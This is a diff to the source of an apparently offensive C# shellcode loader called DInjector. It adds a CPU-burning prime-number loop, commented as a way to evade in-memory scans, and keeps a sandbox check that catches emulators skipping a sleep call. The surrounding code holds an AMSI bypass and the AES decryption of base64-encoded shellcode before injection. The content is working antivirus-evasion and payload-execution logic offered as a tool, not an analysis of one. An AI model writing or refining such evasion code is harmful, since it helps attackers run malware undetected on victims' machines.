@@ -4,13 +4,14 @@ using System.Net;
 using System.Diagnostics;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
+using System.Linq;
 
 namespace DInjector
 {
     class Detonator
     {
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocExNuma(
+        private static extern IntPtr VirtualAllocExNuma(
             IntPtr hProcess,
             IntPtr lpAddress,
             uint dwSize,
@@ -19,7 +20,23 @@ namespace DInjector
             UInt32 nndPreferred);
 
         [DllImport("kernel32.dll")]
-        static extern void Sleep(uint dwMilliseconds);
+        private static extern void Sleep(uint dwMilliseconds);
+
+        private static bool isPrime(int number)
+        {
+            bool calcPrime(int value)
+            {
+                var possibleFactors = Math.Sqrt(number);
+
+                for (var factor = 2; factor <= possibleFactors; factor++)
+                    if (value % factor == 0)
+                        return false;
+
+                return true;
+            }
+
+            return number > 1 && calcPrime(number);
+        }
 
         static void Boom(string[] args)
         {
@@ -30,7 +47,7 @@ namespace DInjector
                 return;
             }
 
-            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
+            // Check if the emulator did not fast-forward through the sleep instruction
             var rand = new Random();
             uint dream = (uint)rand.Next(2000, 3000);
             double delta = dream / 1000 - 0.5;
@@ -43,6 +60,29 @@ namespace DInjector
             }
 
             var options = ArgumentParser.Parse(args);
+
+            // Sleep to evade in-memory scan
+            try
+            {
+                int k = 0, sleep = int.Parse(options["/sleep"]);
+                if (0 < sleep && sleep < 10)
+                    k = 10;
+                else if (10 <= sleep && sleep < 20)
+                    k = 8;
+                else if (20 <= sleep && sleep < 30)
+                    k = 6;
+                else if (30 <= sleep && sleep < 40)
+                    k = 4;
+                else if (40 <= sleep && sleep < 50)
+                    k = 2;
+                else if (50 <= sleep && sleep < 60 || 60 <= sleep)
+                    k = 1;
+
+                int start = 1, end = sleep * k * 100000;
+                _ = Enumerable.Range(start, end - start).Where(isPrime).Select(number => number).ToList();
+            }
+            catch (Exception)
+            { }
 
             // Bypass AMSI
             try
@@ -77,7 +117,7 @@ namespace DInjector
                 shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
             }
 
-            AES ctx = new AES(password);
+            AES ctx = new(password);
             var shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);
 
             var ppid = 0;
